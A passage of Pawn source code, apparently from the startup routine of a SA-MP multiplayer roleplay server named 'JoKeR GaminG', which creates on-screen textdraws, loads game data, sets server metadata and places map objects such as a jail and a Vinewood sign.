ZendanInfo[i][ci3D] = CreateDynamic3DTextLabel(lolstr,COLOR_WHITE,BiroonJail[i][0],BiroonJail[i][1],BiroonJail[i][2],6.0);
ZendanInfo[i][ciOpened] = false;
}
OAC3D = CreateDynamic3DTextLabel("Jail Control Panel\nUse /openallcells to open all cells",COLOR_WHITE,1761.950073,-1542.098510,1993.670043,6.0);
OXRR = CreateDynamic3DTextLabel("Jail Yard\nUse /openyard to open yard",COLOR_WHITE,1762.053588,-1564.047119,2001.460449,6.0);

CreateDynamic3DTextLabel("Jail Yard\nUse /enteryard to enter to yard",COLOR_WHITE,1757.300292,-1539.745361,1993.670043,6.0);
settime();
SetTimer("settime",10000,true);

Time = TextDrawCreate(578.000000, 22.000000, "");
TextDrawAlignment(Time, 2);
TextDrawBackgroundColor(Time, 255);
TextDrawFont(Time, 3);
TextDrawLetterSize(Time, 0.569998, 2.099998);
TextDrawColor(Time, -1);
TextDrawSetOutline(Time, 2);
TextDrawSetProportional(Time, 1);

Date = TextDrawCreate(573.000000, 8.000000, "");
TextDrawAlignment(Date, 2);
TextDrawBackgroundColor(Date, 255);
TextDrawFont(Date, 1);
TextDrawLetterSize(Date, 0.430000, 1.400000);
TextDrawColor(Date, -1);
TextDrawSetOutline(Date, 1);
TextDrawSetProportional(Date, 1);

	TD_ConnectUp[1] = TextDrawCreate(-8.666667, -7.607296, "LD_SPAC:white");
	TextDrawLetterSize(TD_ConnectUp[1], 0.000000, 0.000000);
	TextDrawTextSize(TD_ConnectUp[1], 671.000183, 467.066802);
	TextDrawAlignment(TD_ConnectUp[1], 1);
	TextDrawColor(TD_ConnectUp[1], 255);
	TextDrawSetShadow(TD_ConnectUp[1], 0);
	TextDrawSetOutline(TD_ConnectUp[1], 0);
	TextDrawBackgroundColor(TD_ConnectUp[1], 255);
	TextDrawFont(TD_ConnectUp[1], 4);
	TextDrawSetProportional(TD_ConnectUp[1], 0);
	TextDrawSetShadow(TD_ConnectUp[1], 0);

	TD_ConnectUp[2] = TextDrawCreate(350.000000, 190.000000, ".");
	TextDrawLetterSize(TD_ConnectUp[2], 35.000000, 1.000000);
	TextDrawAlignment(TD_ConnectUp[2], 2);
	TextDrawColor(TD_ConnectUp[2], -1);
	TextDrawSetShadow(TD_ConnectUp[2], 0);
	TextDrawSetOutline(TD_ConnectUp[2], 0);
	TextDrawBackgroundColor(TD_ConnectUp[2], 255);
	TextDrawFont(TD_ConnectUp[2], 1);
	TextDrawSetProportional(TD_ConnectUp[2], 1);
	TextDrawSetShadow(TD_ConnectUp[2], 0);

/*	AccountBar = TextDrawCreate(5.000000, 432.000000, "Server Information");
	TextDrawBackgroundColor(AccountBar, 255);
	TextDrawFont(AccountBar, 1);
	TextDrawLetterSize(AccountBar, 0.350000, 1.299999);
	TextDrawColor(AccountBar, -1);
	TextDrawSetOutline(AccountBar, 0);
	TextDrawSetProportional(AccountBar, 1);
	TextDrawSetShadow(AccountBar, 1);
	TextDrawUseBox(AccountBar, 1);
	TextDrawBoxColor(AccountBar, 255);
	TextDrawTextSize(AccountBar, 634.000000, 825.000000);*/

/*	AccountBar[3] = TextDrawCreate(-1.000000, 275.000000, "LD_SPAC:white");
	TextDrawLetterSize(AccountBar[3], 0.000000, 0.000000);
	TextDrawTextSize(AccountBar[3], 260.000000, 47.000000);
	TextDrawAlignment(AccountBar[3], 1);
	TextDrawColor(AccountBar[3], 70);
	TextDrawSetShadow(AccountBar[3], 0);
	TextDrawSetOutline(AccountBar[3], 0);
	TextDrawBackgroundColor(AccountBar[3], 255);
	TextDrawFont(AccountBar[3], 4);
	TextDrawSetProportional(AccountBar[3], 0);
	TextDrawSetShadow(AccountBar[3], 0); */

	AccountBar[0] = TextDrawCreate(7.500000, 432.812500, "Accounts:_25,030_(23000_Ban)");
	TextDrawLetterSize(AccountBar[0], 0.316999, 1.403125);
	TextDrawAlignment(AccountBar[0], 1);
	TextDrawColor(AccountBar[0], -1);
	TextDrawSetShadow(AccountBar[0], 1);
	TextDrawSetOutline(AccountBar[0], 0);
	TextDrawBackgroundColor(AccountBar[0], 255);
	TextDrawFont(AccountBar[0], 1);
	TextDrawSetProportional(AccountBar[0], 1);
	TextDrawSetShadow(AccountBar[0], 1);

	AccountBar[1] = TextDrawCreate(190.500000, 432.375000, "New_account:_Darya_KhaNoooM");
	TextDrawLetterSize(AccountBar[1], 0.316999, 1.403125);
	TextDrawAlignment(AccountBar[1], 1);
	TextDrawColor(AccountBar[1], -1);
	TextDrawSetShadow(AccountBar[1], 1);
	TextDrawSetOutline(AccountBar[1], 0);
	TextDrawBackgroundColor(AccountBar[1], 255);
	TextDrawFont(AccountBar[1], 1);
	TextDrawSetProportional(AccountBar[1], 1);
	TextDrawSetShadow(AccountBar[1], 1);

	AccountBar[2] = TextDrawCreate(396.500000, 432.375000, "Most_players_online:_300_2015.08.17_17:13");
	TextDrawLetterSize(AccountBar[2], 0.316999, 1.403125);
	TextDrawAlignment(AccountBar[2], 1);
	TextDrawColor(AccountBar[2], -1);
	TextDrawSetShadow(AccountBar[2], 1);
	TextDrawSetOutline(AccountBar[2], 0);
	TextDrawBackgroundColor(AccountBar[2], 255);
	TextDrawFont(AccountBar[2], 1);
	TextDrawSetProportional(AccountBar[2], 1);
	TextDrawSetShadow(AccountBar[2], 1);

//	TD_Site = TextDrawCreate(636.500000, 433.250000, "id telegram:JokerGaming");
//	TextDrawLetterSize(TD_Site, 0.283999, 1.617499);
//	TextDrawAlignment(TD_Site, 3);
//	TextDrawColor(TD_Site, -1061109505);
//	TextDrawSetShadow(TD_Site, 0);
//	TextDrawSetOutline(TD_Site, 1);
//	TextDrawBackgroundColor(TD_Site, 255);
//	TextDrawFont(TD_Site, 3);
//	TextDrawSetProportional(TD_Site, 1);
//	TextDrawSetShadow(TD_Site, 0);

		TD_Site1 = TextDrawCreate(584.400268, 428.574400, "Samp.JokerGaming.ir");
TextDrawLetterSize(TD_Site1, 0.282799, 1.689599);
TextDrawTextSize(TD_Site1, 200.800018+50, -37.333354+50);
TextDrawAlignment(TD_Site1, 2);
TextDrawColor(TD_Site1, 0xFFFFFFAA);
TextDrawSetShadow(TD_Site1, 0);
TextDrawSetOutline(TD_Site1, 0);
TextDrawBackgroundColor(TD_Site1, -0x950606FF);
TextDrawFont(TD_Site1, 1);
TextDrawSetProportional(TD_Site1, 1);
TextDrawSetSelectable(TD_Site1, true);


	TD_LoadingAccount[0] = TextDrawCreate(222.000000, 285.000000, "LD_SPAC:white");
	TextDrawLetterSize(TD_LoadingAccount[0], 0.000000, 0.000000);
	TextDrawTextSize(TD_LoadingAccount[0], 246.666320, 32.755622);
	TextDrawAlignment(TD_LoadingAccount[0], 1);
	TextDrawColor(TD_LoadingAccount[0], 100);
	TextDrawSetShadow(TD_LoadingAccount[0], 0);
	TextDrawSetOutline(TD_LoadingAccount[0], 0);
	TextDrawBackgroundColor(TD_LoadingAccount[0], 255);
	TextDrawFont(TD_LoadingAccount[0], 4);
	TextDrawSetProportional(TD_LoadingAccount[0], 0);
	TextDrawSetShadow(TD_LoadingAccount[0], 0);

	TD_LoadingAccount[1] = TextDrawCreate(261.966613, 288.578002, "Account Shoma Dar Hale ~g~Load ~w~Shodan Ast.~n~~r~Lotfan Kami Sabr Konid.");
	TextDrawLetterSize(TD_LoadingAccount[1], 0.213666, 1.351111);
	TextDrawAlignment(TD_LoadingAccount[1], 1);
	TextDrawColor(TD_LoadingAccount[1], -1);
	TextDrawSetShadow(TD_LoadingAccount[1], 0);
	TextDrawSetOutline(TD_LoadingAccount[1], 0);
	TextDrawBackgroundColor(TD_LoadingAccount[1], 255);
	TextDrawFont(TD_LoadingAccount[1], 2);
	TextDrawSetProportional(TD_LoadingAccount[1], 1);
	TextDrawSetShadow(TD_LoadingAccount[1], 0);

	TD_LoadingAccount[2] = TextDrawCreate(200.000000, 270.000000, "LD_DRV:GOLD");
	TextDrawLetterSize(TD_LoadingAccount[2], 0.000000, 0.000000);
	TextDrawTextSize(TD_LoadingAccount[2], 60.000000, 65.000000);
	TextDrawAlignment(TD_LoadingAccount[2], 1);
	TextDrawColor(TD_LoadingAccount[2], 16711935);
	TextDrawSetShadow(TD_LoadingAccount[2], 0);
	TextDrawSetOutline(TD_LoadingAccount[2], 0);
	TextDrawBackgroundColor(TD_LoadingAccount[2], 255);
	TextDrawFont(TD_LoadingAccount[2], 4);
	TextDrawSetProportional(TD_LoadingAccount[2], 0);
	TextDrawSetShadow(TD_LoadingAccount[2], 0);




    for(new i;i<8;i++)
    {
        strmid(News[i][Sender],"No-one",0,strlen("No-one"),MAX_PLAYER_NAME);
        strmid(News[i][Text],"Nothing",0,strlen("Nothing"),256);
    }
    for(new i;i<LastPID;i++)
    {
        AgentContractIDUsed[i] = false;
        ContractIDUsed[i] = false;
    }
    ContractsCount = 0;
    LoadBizz();
    LoadSBizz();
    LoadStuff();
    LoadDynamicFactions();
    LoadDynamicClans();
    LoadTurfs();
    LoadHouses();

    ManualVehicleEngineAndLights();
	format(string, sizeof(string), "Nothing");
    format(string1, sizeof(string1), "No-one");
    PlayerHaul[98][pCapasity] = 100;
    PlayerHaul[99][pCapasity] = 100;
    PlayerHaul[100][pCapasity] = 50;
    PlayerHaul[101][pCapasity] = 50;
    SetGameModeText("JG 0.0.4");
	SendRconCommand("hostname :: JoKeR GaminG ::");
	//SendRconCommand("JokerGaming.ir");
	SendRconCommand("mapname LS-LV-SF");
	SendRconCommand("language Fa/En");
	SendRconCommand("weburl Forum.JokerGaming.ir");
    gettime(ghour, gminute, gsecond);
    FixHour(ghour);
    ghour = shifthour;
    AllowInteriorWeapons(1);
    UsePlayerPedAnims();
    DisableInteriorEnterExits();
    EnableStuntBonusForAll(0);
 //============================hotdoghotel=====================================
    CreateObject(1340, 730.190124,-1267.223022,13.553401,   0.00000, 0.00000, 0.00000);
     //4rah
CreateObject(19425, 1365.72229, -1025.68677, 25.49360,   0.00000, 0.00000, 0.00000);
CreateObject(19425, 1370.86621, -1025.58264, 25.49360,   0.00000, 0.00000, 0.00000);
CreateObject(19425, 1356.40430, -1025.63745, 25.48960,   0.00000, 0.00000, 0.00000);
CreateObject(19425, 1351.04114, -1025.76099, 25.47340,   0.00000, 0.00000, 0.00000);
CreateObject(19425, 1345.24646, -1033.87903, 25.42040,   0.00000, 0.00000, 91.00000);
CreateObject(19425, 1345.31055, -1038.69458, 25.43040,   0.00000, 0.00000, 91.00000);
CreateObject(19425, 1351.15149, -1053.65588, 25.61840,   0.00000, 0.00000, -4.00000);
CreateObject(19425, 1356.22046, -1053.98181, 25.62390,   0.00000, 0.00000, -4.00000);
CreateObject(19425, 1366.01831, -1054.19458, 25.62800,   0.00000, 0.00000, 0.00000);
CreateObject(19425, 1371.49902, -1054.32422, 25.60870,   0.00000, 0.00000, 0.00000);
CreateObject(19425, 1378.78784, -1033.79944, 25.47540,   0.00000, 0.00000, 91.00000);
CreateObject(19425, 1378.93933, -1038.66724, 25.46900,   0.00000, 0.00000, 91.00000);
CreateObject(955, 1340.70837, -1026.76208, 26.53450,   0.00000, 7.00000, 0.00000);
CreateObject(1571, 1376.78296, -1044.80969, 26.83120,   0.00000, 0.00000, 230.00000);
CreateObject(11489, 1380.79065, -1023.20728, 25.54200,   0.00000, 0.00000, -50.00000);
CreateObject(9833, 1360.84314, -1049.23315, 28.36350,   0.00000, 0.00000, 20.00000);
CreateObject(3471, 1369.90247, -956.67419, 34.43380,   0.00000, 0.00000, 87.00000);
CreateObject(19425, 1387.09558, -949.28149, 33.17890,   0.00000, 0.00000, 85.00000);
CreateObject(19425, 1387.75281, -944.27759, 33.17890,   0.00000, 0.00000, 85.00000);
CreateObject(19425, 1388.04578, -939.50720, 33.17930,   0.00000, 0.00000, 85.00000);
CreateObject(19425, 1388.44226, -934.17517, 33.17860,   0.00000, 0.00000, 85.00000);
CreateObject(19425, 1380.13379, -957.53088, 33.13860,   0.00000, 0.00000, -7.00000);
CreateObject(19425, 1374.90186, -956.83539, 33.14140,   0.00000, 0.00000, -7.00000);
CreateObject(19425, 1360.59351, -954.36481, 33.16820,   0.00000, 0.00000, -7.00000);
CreateObject(19425, 1365.29956, -954.97009, 33.17150,   0.00000, 0.00000, -7.00000);
CreateObject(19425, 1353.27795, -944.69409, 33.25100,   0.00000, 0.00000, 85.00000);
CreateObject(19425, 1353.68933, -939.71191, 33.27250,   0.00000, 0.00000, 85.00000);
CreateObject(19425, 1354.16846, -934.68481, 33.32260,   0.00000, 0.00000, 85.00000);
CreateObject(19425, 1354.51306, -929.44659, 33.25260,   0.00000, 0.00000, 85.00000);
CreateObject(19425, 1364.25330, -922.43311, 33.16230,   0.00000, 0.00000, -7.00000);
CreateObject(19425, 1369.16919, -922.93188, 33.16290,   0.00000, 0.00000, -7.00000);
CreateObject(19425, 1378.91724, -924.07257, 33.17690,   0.00000, 0.00000, -7.00000);
CreateObject(19425, 1383.99646, -924.72101, 33.16230,   0.00000, 0.00000, -7.00000);
CreateObject(3092, 1304.63635, -876.68817, 39.53220,   0.00000, 0.00000, 0.00000);
CreateObject(1550, 1305.38940, -876.72668, 38.95230,   0.00000, 0.00000, 0.00000);
//--

CreateObject(19128, 1217.27307, -1812.30615, 15.54418,   0.00000, 0.00000, 0.00000);
CreateObject(19128, 1221.23669, -1812.28528, 15.54418,   0.00000, 0.00000, 0.00000);
CreateObject(2773, 1220.38940, -1812.51868, 16.11456,   0.00000, 0.00000, 0.00000);
CreateObject(2773, 1218.05847, -1812.54590, 16.11456,   0.00000, 0.00000, 0.00000);
CreateObject(18655, 1221.25793, -1812.51599, 15.53229,   0.00000, 0.00000, 0.00000);
CreateObject(18653, 1217.27026, -1812.57666, 15.60782,   0.00000, 0.00000, -181.43997);
CreateObject(9833, 1213.76843, -1814.14648, 16.92797,   0.00000, 0.00000, 30.18000);
CreateObject(9833, 1223.74597, -1813.93640, 16.92797,   0.00000, 0.00000, 30.18000);
CreateObject(18740, 1214.06445, -1813.87488, 20.10773,   0.00000, 0.00000, 0.00000);
CreateObject(18740, 1223.97876, -1813.61621, 20.10820,   0.00000, 0.00000, 0.00000);
CreateObject(18657, 1207.81165, -1816.21936, 25.65800,   35.58000, 4.44000, -80.58005);
CreateObject(18658, 1198.31653, -1816.68518, 26.85828,   40.01999, 1.02000, 77.46001);
CreateObject(18656, 1203.25684, -1815.76770, 27.16805,   103.67998, 7.32000, 0.00000);
CreateObject(1361, 1220.95313, -1814.31311, 16.34397,   0.00000, 0.00000, 0.00000);
CreateObject(1361, 1217.43164, -1814.35022, 16.34397,   0.00000, 0.00000, 0.00000);
CreateObject(1361, 1217.52283, -1815.95569, 16.34397,   0.00000, 0.00000, 0.00000);
CreateObject(3802, 1218.14319, -1812.03137, 18.26019,   0.00000, 0.00000, -87.53999);
CreateObject(3802, 1220.38306, -1812.01538, 18.26019,   0.00000, 0.00000, -87.53999);
CreateObject(1360, 1222.42444, -1824.35010, 13.37890,   0.00000, 0.00000, 0.00000);
CreateObject(1360, 1225.56860, -1824.31079, 13.37890,   0.00000, 0.00000, 0.00000);
CreateObject(1360, 1234.00171, -1821.38147, 13.37890,   0.00000, 0.00000, 0.00000);
CreateObject(1360, 1233.96021, -1815.98901, 13.37890,   0.00000, 0.00000, 0.00000);
CreateObject(1360, 1230.34338, -1823.28223, 13.37890,   0.00000, 0.00000, -91.20000);
CreateObject(1360, 1235.14502, -1810.65466, 13.37890,   0.00000, 0.00000, -88.08000);
CreateObject(3398, 1225.25269, -1813.37390, 11.07133,   0.00000, 0.00000, -60.00002);
CreateObject(3398, 1215.30896, -1816.55237, 11.07133,   0.00000, 0.00000, 138.36005);
CreateObject(3398, 1238.39734, -1819.15930, 12.40184,   0.00000, 0.00000, -91.97997);
CreateObject(3398, 1238.86304, -1819.19141, 12.40184,   0.00000, 0.00000, 88.26000);
CreateObject(3398, 1264.12671, -1829.77979, 12.37436,   0.00000, 0.00000, 0.00000);
CreateObject(3398, 1264.09778, -1829.30139, 12.37436,   0.00000, 0.00000, 177.71997);
CreateObject(869, 1193.99731, -1839.45386, 13.17503,   0.00000, 0.00000, 0.00000);
CreateObject(869, 1197.41101, -1839.29333, 13.17503,   0.00000, 0.00000, 0.00000);
CreateObject(869, 1201.00159, -1839.29285, 13.17503,   0.00000, 0.00000, 0.00000);
CreateObject(869, 1192.91016, -1836.69617, 13.17503,   0.00000, 0.00000, 0.00000);
CreateObject(869, 1192.31287, -1833.77808, 13.17503,   0.00000, 0.00000, 0.00000);
CreateObject(869, 1192.30505, -1831.07361, 13.17503,   0.00000, 0.00000, 0.00000);
CreateObject(869, 1192.39417, -1828.07349, 13.17503,   0.00000, 0.00000, 0.00000);
CreateObject(3505, 1198.24841, -1840.59058, 12.73046,   0.00000, 0.00000, 0.00000);
CreateObject(3505, 1191.82190, -1832.61340, 12.73046,   0.00000, 0.00000, 0.00000);
CreateObject(869, 1226.56055, -1839.95532, 13.17503,   0.00000, 0.00000, 0.00000);
CreateObject(869, 1230.37122, -1839.65881, 13.17503,   0.00000, 0.00000, 0.00000);
CreateObject(869, 1233.85510, -1839.61182, 13.17503,   0.00000, 0.00000, 0.00000);
CreateObject(869, 1236.90259, -1839.43066, 13.17503,   0.00000, 0.00000, 0.00000);
CreateObject(869, 1240.60571, -1839.43103, 13.17503,   0.00000, 0.00000, 0.00000);
CreateObject(869, 1244.32568, -1839.53210, 13.17503,   0.00000, 0.00000, 0.00000);
CreateObject(869, 1247.66650, -1839.58044, 13.17503,   0.00000, 0.00000, 0.00000);
CreateObject(869, 1250.97192, -1839.48755, 13.17503,   0.00000, 0.00000, 0.00000);
CreateObject(869, 1253.95276, -1839.54443, 13.17503,   0.00000, 0.00000, 0.00000);
CreateObject(869, 1257.37378, -1839.57532, 13.17503,   0.00000, 0.00000, 0.00000);
CreateObject(3507, 1255.60864, -1839.94653, 12.69897,   0.00000, 0.00000, 0.00000);
CreateObject(3507, 1241.46228, -1839.98450, 12.69897,   0.00000, 0.00000, 0.00000);
CreateObject(3507, 1227.18115, -1839.62622, 12.69897,   0.00000, 0.00000, 0.00000);
CreateObject(8843, 1248.48047, -1849.78418, 12.40356,   0.00000, 0.00000, 91.32001);
CreateObject(8843, 1221.92004, -1850.27539, 12.40356,   0.00000, 0.00000, 91.32001);
CreateObject(8843, 1196.98865, -1850.66235, 12.40356,   0.00000, 0.00000, 91.32001);
CreateObject(8843, 1197.43030, -1855.13672, 12.40356,   0.00000, 0.00000, 271.01984);
CreateObject(8843, 1222.94629, -1854.89526, 12.40356,   0.00000, 0.00000, 271.01984);
CreateObject(8843, 1247.90857, -1854.78223, 12.40356,   0.00000, 0.00000, 271.01984);
CreateObject(8843, 1275.18799, -1854.61938, 12.40356,   0.00000, 0.00000, 271.01984);
CreateObject(8843, 1275.54114, -1849.49890, 12.40356,   0.00000, 0.00000, 91.32001);
CreateObject(869, 1283.14966, -1840.17090, 13.17503,   0.00000, 0.00000, 0.00000);
CreateObject(869, 1285.56152, -1836.25049, 13.17503,   0.00000, 0.00000, 77.88001);
CreateObject(869, 1285.51709, -1832.52893, 13.17503,   0.00000, 0.00000, 77.88001);
CreateObject(869, 1285.33923, -1828.38293, 13.17503,   0.00000, 0.00000, 77.88001);
CreateObject(869, 1285.37085, -1824.63379, 13.17503,   0.00000, 0.00000, 77.88001);
CreateObject(869, 1285.50098, -1820.91272, 13.17503,   0.00000, 0.00000, 77.88001);
CreateObject(869, 1285.44556, -1817.25708, 13.17503,   0.00000, 0.00000, 77.88001);
CreateObject(869, 1285.36389, -1813.67761, 13.17503,   0.00000, 0.00000, 77.88001);
CreateObject(869, 1285.38770, -1810.55701, 13.17503,   0.00000, 0.00000, 77.88001);
CreateObject(869, 1285.42578, -1806.97681, 13.17503,   0.00000, 0.00000, 77.88001);
CreateObject(869, 1285.28333, -1803.39917, 13.17503,   0.00000, 0.00000, 77.88001);
CreateObject(869, 1285.24219, -1799.81824, 13.17503,   0.00000, 0.00000, 77.88001);
CreateObject(869, 1285.11169, -1795.99988, 13.17503,   0.00000, 0.00000, 77.88001);
CreateObject(3507, 1283.23035, -1840.34863, 12.79298,   0.00000, 0.00000, 0.00000);
CreateObject(3505, 1285.43896, -1827.81677, 12.76698,   0.00000, 0.00000, 0.00000);
CreateObject(3507, 1285.15625, -1813.40295, 12.79298,   0.00000, 0.00000, -20.04000);
CreateObject(3505, 1285.37354, -1797.40747, 12.76698,   0.00000, 0.00000, 0.00000);
CreateObject(19425, 1237.77747, -1817.32178, 12.41761,   0.00000, 0.00000, 0.00000);
CreateObject(19425, 1237.77832, -1816.52100, 12.41761,   0.00000, 0.00000, 0.00000);
CreateObject(19425, 1237.80029, -1815.68079, 12.41761,   0.00000, 0.00000, 0.00000);
CreateObject(19425, 1237.81946, -1814.94031, 12.41761,   0.00000, 0.00000, 0.00000);
CreateObject(19425, 1237.83850, -1814.22021, 12.41761,   0.00000, 0.00000, 0.00000);
CreateObject(19425, 1237.81738, -1813.49927, 12.41761,   0.00000, 0.00000, 0.00000);
    //--------------------------------------------------------[VineWoodNewCreateByHaSaN]
    CreateObject(18981, 1396.77954, -814.55188, 73.62010,   0.00000, 0.00000, 0.00000);
CreateObject(18981, 1445.54614, -814.58917, 69.16010,   0.00000, 0.00000, 0.00000);
CreateObject(18981, 1408.77759, -814.57678, 81.16010,   0.00000, 90.00000, 0.00000);
CreateObject(18981, 1433.53760, -814.57678, 81.16010,   0.00000, 90.00000, 0.06000);
CreateObject(18981, 1408.76465, -802.04053, 85.64010,   0.00000, 0.00000, 90.00000);
CreateObject(18981, 1433.54663, -802.04260, 85.64010,   0.00000, 0.00000, 90.00000);
CreateObject(18981, 1408.77197, -814.02820, 97.72010,   0.00000, 90.00000, 90.00000);
CreateObject(18981, 1433.55200, -814.02820, 97.72010,   0.00000, 90.00000, 90.00000);
CreateObject(18981, 1396.75952, -814.59192, 85.68010,   0.00000, 0.00000, 0.00000);
CreateObject(18981, 1433.52869, -826.61603, 69.18010,   0.00000, 0.00000, 90.00000);
CreateObject(18981, 1408.79822, -826.58972, 69.18010,   0.00000, 0.00000, 90.00000);
CreateObject(18981, 1408.75854, -826.60120, 85.70010,   0.00000, 0.00000, 90.00000);
CreateObject(18981, 1433.53894, -826.61029, 85.70010,   0.00000, 0.00000, 90.00000);
CreateObject(16132, 1417.45251, -817.60608, 98.14940,   0.00000, 0.00000, 90.00000);
CreateObject(18657, 1397.23010, -825.41858, 96.30660,   70.00000, 0.00000, -70.00000);
CreateObject(18658, 1444.91907, -825.78857, 96.25310,   70.00000, 0.00000, 84.00000);
CreateObject(18656, 1420.08521, -802.64172, 96.40830,   74.00000, 0.00000, 180.00000);
CreateObject(19129, 1406.27783, -812.38013, 81.60100,   0.00000, 0.00000, 0.00000);
CreateObject(19129, 1423.65186, -812.41650, 81.60100,   0.00000, 0.00000, -0.06000);
CreateObject(19129, 1435.12585, -812.40387, 81.60100,   0.00000, 0.00000, 0.06000);
CreateObject(18981, 1445.59485, -802.27502, 85.72010,   0.00000, 0.00000, 0.00000);
CreateObject(18981, 1445.59375, -814.60437, 100.99440,   0.00000, 0.00000, 0.00000);
CreateObject(18102, 1408.83044, -805.95947, 89.82740,   0.00000, 0.00000, -0.06000);
CreateObject(18981, 1408.77197, -814.02820, 89.80010,   0.00000, 90.00000, 90.00000);
CreateObject(18102, 1408.86340, -816.91193, 89.92740,   0.00000, 0.00000, 0.00000);
CreateObject(18102, 1417.22949, -806.52032, 89.94740,   0.00000, 0.00000, -0.18000);
CreateObject(18102, 1420.38135, -817.09943, 89.96740,   0.00000, 0.00000, 0.00000);
CreateObject(2780, 1432.99524, -802.90424, 81.64480,   0.00000, 0.00000, 0.00000);
CreateObject(2780, 1444.54553, -802.96381, 81.64480,   0.00000, 0.00000, -0.06000);
CreateObject(2780, 1423.35071, -802.67438, 81.64480,   0.00000, 0.00000, 0.00000);
CreateObject(2780, 1413.47729, -802.68011, 81.64480,   0.00000, 0.00000, 0.00000);
CreateObject(2780, 1397.53979, -802.72791, 81.64480,   0.00000, 0.00000, 0.00000);
CreateObject(2780, 1397.34338, -812.57257, 81.71560,   0.00000, 0.00000, 90.00000);
CreateObject(2780, 1397.33350, -821.97174, 81.71560,   0.00000, 0.00000, 90.00000);
CreateObject(16151, 1401.29187, -825.29602, 81.65650,   0.00000, 0.00000, -90.00000);
CreateObject(16151, 1416.30212, -825.08936, 81.65650,   0.00000, 0.00000, -90.00000);
CreateObject(16151, 1432.69067, -825.28210, 81.65650,   0.00000, 0.00000, -90.06000);
CreateObject(18981, 1432.73169, -807.41931, 89.80010,   0.00000, 90.00000, 90.00000);
CreateObject(18102, 1432.11292, -808.01202, 89.94740,   0.00000, 0.00000, -0.18000);
CreateObject(18102, 1442.99011, -806.73224, 89.94740,   0.00000, 0.00000, -0.18000);
CreateObject(18102, 1430.82520, -816.64136, 89.96740,   0.00000, 0.00000, -0.06000);
CreateObject(18102, 1443.76563, -816.91064, 89.94740,   0.00000, 0.00000, -0.18000);
CreateObject(10245, 1430.25769, -821.40692, 85.61900,   0.28000, 0.00000, 225.00000);
CreateObject(19366, 1437.65662, -821.50140, 81.55640,   0.00000, 120.00000, 0.00000);
CreateObject(19129, 1407.22559, -812.20898, 90.25350,   0.00000, 0.00000, 0.00000);
CreateObject(19129, 1426.82495, -809.91217, 90.25350,   0.00000, 0.00000, 0.00000);
CreateObject(2780, 1397.65088, -802.63605, 90.32669,   0.00000, 0.00000, 0.00000);
CreateObject(2780, 1397.00671, -810.61420, 90.57030,   0.00000, 0.00000, 90.00000);
CreateObject(2780, 1409.43066, -802.40881, 90.67430,   0.00000, 0.00000, 0.00000);
CreateObject(2780, 1423.38110, -802.25800, 90.52074,   0.00000, 0.00000, 0.00000);
CreateObject(2780, 1435.42554, -802.53528, 90.30750,   0.00000, 0.00000, 0.00000);
CreateObject(19608, 1403.17407, -804.78473, 90.27370,   0.00000, 0.00000, 0.24000);
CreateObject(19608, 1417.37415, -804.87457, 90.27390,   0.00000, 0.00000, 0.00000);
CreateObject(19608, 1429.15186, -804.76068, 90.27850,   0.00000, 0.00000, 0.00000);
CreateObject(19608, 1440.65723, -804.80170, 90.28960,   0.00000, 0.00000, 0.00000);
CreateObject(19129, 1435.20496, -809.91217, 90.25350,   0.00000, 0.00000, 0.00000);
CreateObject(19608, 1399.56909, -817.07129, 90.31130,   0.00000, 0.00000, 90.30000);
CreateObject(19609, 1414.74402, -806.12079, 90.31965,   0.00000, 0.00000, 0.00000);
CreateObject(19609, 1420.40002, -806.13965, 90.31965,   0.00000, 0.00000, 0.00000);
CreateObject(19609, 1426.17847, -805.97931, 90.32401,   0.00000, 0.00000, 0.00000);
CreateObject(19609, 1431.98352, -806.02557, 90.32391,   0.00000, 0.00000, 0.00000);
CreateObject(19609, 1437.89185, -805.99835, 90.33368,   0.00000, 0.00000, 0.00000);
CreateObject(19609, 1443.35474, -806.11859, 90.33392,   0.00000, 0.00000, 0.00000);
CreateObject(19609, 1400.25684, -806.05743, 90.31942,   0.00000, 0.00000, 0.00000);
CreateObject(19609, 1406.10291, -806.27869, 90.31960,   0.00000, 0.00000, 0.00000);
CreateObject(19609, 1400.80640, -814.18317, 90.35700,   0.00000, 0.00000, 90.00000);
CreateObject(19609, 1400.97534, -819.67969, 90.35720,   0.00000, 0.00000, 90.00000);
CreateObject(18981, 1396.76514, -814.05371, 100.99440,   0.00000, 0.00000, 0.00000);
CreateObject(18981, 1408.76465, -802.02051, 101.00010,   0.00000, 0.00000, 90.00000);
CreateObject(18981, 1433.54663, -802.02051, 101.00010,   0.00000, 0.00000, 90.00000);
CreateObject(3515, 1401.26794, -824.74573, 98.21013,   0.00000, 0.00000, 0.00000);
CreateObject(3515, 1440.03674, -824.83984, 98.20887,   0.00000, 0.00000, 0.00000);
CreateObject(3515, 1420.27686, -825.00873, 98.20757,   0.00000, 0.00000, 0.00000);
CreateObject(3515, 1419.19043, -823.89996, 90.29488,   0.00000, 0.00000, 0.00000);
CreateObject(16151, 1407.18689, -825.10809, 90.29330,   0.00000, 0.00000, -90.00000);
CreateObject(16151, 1444.26001, -813.38312, 90.30559,   0.00000, 0.00000, 0.00000);
hasan8 = CreateObject(18755, 1448.34814, -823.98730, 68.29790,   0.00000, 0.00000, 270.00000);
CreateObject(19454, 1445.70361, -825.98010, 64.59970,   0.00000, 0.00000, 90.00000);
CreateObject(19454, 1450.44373, -821.21588, 64.67970,   0.00000, 0.00000, 180.00000);
CreateObject(19454, 1445.56909, -821.91882, 64.64690,   0.00000, 0.00000, 90.00000);
CreateObject(19454, 1445.54785, -820.45422, 65.32690,   0.00000, -55.00000, 90.00000);
CreateObject(19454, 1447.53467, -817.32971, 81.58580,   0.00000, 90.00000, 0.00000);
CreateObject(19454, 1449.20264, -817.32391, 83.22580,   0.00000, 0.00000, 0.00000);
new Vine = CreateObject(7914, 1411.86145, -824.44952, 104.09010,   0.00000, 0.00000, 0.00000);
new Vine1 = CreateObject(7914, 1428.65417, -824.44897, 104.09010,   0.00000, 0.00000, 0.00000);
SetObjectMaterialText(Vine, "{FFFFFF}JokeR ", 0, OBJECT_MATERIAL_SIZE_256x128, "Arial", 50, 1, 0xfff0f0f0, 0, 1);
SetObjectMaterialText(Vine1, "{0049FF}GaminG", 0, OBJECT_MATERIAL_SIZE_256x128, "Arial", 50, 1, 0xfff0f0f0, 0, 1);
    /*--------------------------------***JAIL***----------------------------------*/
    CreateObject(8661, 1784.43811, -1568.55273, 2000.46045,   0.00000, 0.00000, 0.00000);
    CreateObject(2139, 1763.12256, -1577.14709, 2000.44165,   0.00000, 0.00000, 180.00000);
    CreateObject(8614, 1758.65491, -1573.59729, 1995.13818,   0.00000, 0.00000, 90.00000);
